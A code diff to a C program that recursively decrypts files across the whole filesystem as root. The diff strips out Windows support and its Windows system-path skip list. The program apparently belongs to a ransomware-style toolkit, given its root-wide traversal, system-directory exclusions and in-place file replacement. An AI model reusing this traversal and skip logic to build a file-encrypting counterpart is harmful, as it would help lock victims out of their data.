@@ -29,10 +29,6 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#ifdef _WIN64
-#include <windows.h>
-#endif
-
 #include "../lib/log.h"
 #include "../lib/pool.h"
 #include "../lib/rsa.h"
@@ -89,25 +85,10 @@ void decrypt_file(void *arg) {
       break;
   }
 
-#ifdef _WIN64
-  fclose(in);
-  fclose(out);
-
-  out = NULL;
-  in  = NULL;
-
-  if (!copy_stat(in_file, out_file)) {
-    debug("(%s) Failed to copy perms", in_file);
-    goto FREE;
-  }
-
-  SetFileAttributes(in_file, GetFileAttributes(in_file) & ~FILE_ATTRIBUTE_READONLY);
-#else
   if (!copy_stat(fileno(in), fileno(out))) {
     debug("(%s) Failed to copy perms", in_file);
     goto FREE;
   }
-#endif
 
   if (unlink(in_file) < 0) {
     debug("(%s) Failed to unlink: %s", in_file);
@@ -128,9 +109,6 @@ FREE:
 
   if (!success) {
     error("Failed to decrypt file: %s", in_file);
-#ifdef _WIN64
-    SetFileAttributes(out_file, GetFileAttributes(out_file) & ~FILE_ATTRIBUTE_READONLY);
-#endif
     unlink(out_file);
   }
 
@@ -138,15 +116,8 @@ FREE:
 }
 
 void decrypt_files(char *path, threadpool pool) {
-#ifdef _WIN64
-  if (eq(path, "/$WinREAgent") || eq(path, "/$Recycle.Bin") || eq(path, "/Windows") ||
-      eq(path, "/Documents and Settings") || eq(path, "/swapfile.sys") || eq(path, "/Config.Msi"))
+  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run"))
     return;
-#else
-  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run") || eq(path, "/swapfile") ||
-      eq(path, "/swap"))
-    return;
-#endif
 
   if (path[1] != '\0' && is_root_path(path))
     info("Decrypting %s...", path);
@@ -192,9 +163,7 @@ void decrypt_files(char *path, threadpool pool) {
 }
 
 int main(int argc, char *argv[]) {
-  log_init();
-
-  if (!is_root()) {
+  if (getuid() != 0) {
     error("Please run as root!");
     return EXIT_FAILURE;
   }
